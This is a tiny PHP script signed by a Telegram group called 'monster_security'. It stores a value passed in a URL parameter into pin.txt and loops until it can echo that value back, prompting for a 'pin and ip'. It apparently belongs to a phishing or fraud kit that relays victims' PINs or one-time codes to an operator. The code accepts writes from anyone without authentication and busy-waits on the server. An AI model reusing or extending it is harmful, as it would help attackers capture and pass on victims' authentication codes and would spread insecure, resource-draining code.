<?php
/***********************
Team : https://t.me/monster_security
***********************/
if(isset($_GET["MONSTER_SECURITY"])){
	file_put_contents("pin.txt",$_GET["MONSTER_SECURITY"]);
	
}

echo 'plase white pin and ip : ';

while(true){

if(file_exists("pin.txt")){
	
	if(file_get_contents("pin.txt") != "none"){
		echo file_get_contents("pin.txt");
	file_put_contents("pin.txt","none");
	break;
	}
	
}

}



?>